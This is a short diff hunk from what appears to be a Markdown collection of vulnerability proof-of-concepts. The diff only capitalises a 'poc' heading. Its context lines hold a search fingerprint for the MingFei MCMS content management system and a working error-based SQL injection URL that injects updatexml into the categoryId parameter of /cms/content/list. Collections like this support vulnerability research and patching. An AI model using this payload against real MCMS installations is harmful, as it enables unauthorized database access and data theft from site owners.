@@ -5,7 +5,7 @@
 body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
 ```
 
-## poc
+## POC
 ```
 http://127.0.0.1/cms/content/list?categoryId=1%27%20and%20updatexml(1,concat(0x7e,md5(123),0x7e),1)%20and%20%271
 ```
